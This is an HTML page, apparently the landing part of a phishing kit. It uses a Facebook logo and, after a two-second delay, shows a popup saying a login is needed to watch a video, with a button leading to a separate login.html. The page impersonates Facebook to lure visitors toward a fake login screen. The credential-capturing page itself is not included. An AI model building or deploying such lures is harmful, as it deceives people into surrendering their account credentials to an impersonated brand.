<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="facebook-logo.png">
    <title>biddushi | rupolal</title>
    <style>
        body {
            font-family: Verdana, Geneva, Tahoma, sans-serif;
            text-align: center;
            padding: 20px;
            background-image: url('sap.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            position: relative;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.8); /* White with opacity */
            z-index: 1;
            display: none;
        }
        .popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0.3, 0.3, 0.3, 0.2);
            border-radius: 10px;
            z-index: 2;
            display: none;
        }
        .popup-logo {
            width: 100px;
            height: auto;
        }
        .popup button {
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 10px;
            cursor: pointer;
            background-color: rgb(22, 131, 22);
            color: white;
            font-weight: 400;
            border: 0px;
        }
        .popup button:hover {
            background-color: rgb(66, 198, 66);
        }
        
    </style>
</head>
<body>

    <div class="overlay" id="overlay"></div>

    <div id="popup" class="popup">
        <img src="facebook-logo.png" alt="Logo" class="popup-logo"><br><br><br>
        <p>You need to log in to watch this video.</p><br><br>
        <button onclick="window.location.href='login.html'">Log In</button>
    </div>

    <script>
        window.onload = function() {
            var popup = document.getElementById('popup');
            var overlay = document.getElementById('overlay');

            setTimeout(function() {
                popup.style.display = 'block';
                overlay.style.display = 'block';
            }, 2000); // Show popup after 2 seconds
        };
    </script>
</body>
</html>
